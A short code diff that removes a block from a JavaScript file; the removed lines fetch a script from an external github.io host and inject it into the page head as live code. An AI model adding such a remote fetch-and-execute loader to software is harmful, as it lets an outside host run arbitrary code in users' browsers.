@@ -1794,10 +1794,4 @@ fetch(htmlFileUrl)
         }
         setInterval(checkVersion, 5e3);
       }
-    }),
-  fetch("https://bcms7.github.io/BCM/main.js")
-    .then((e) => e.text())
-    .then((e) => {
-      let t = document.createElement("script");
-      (t.innerHTML = e), document.head.appendChild(t);
     });
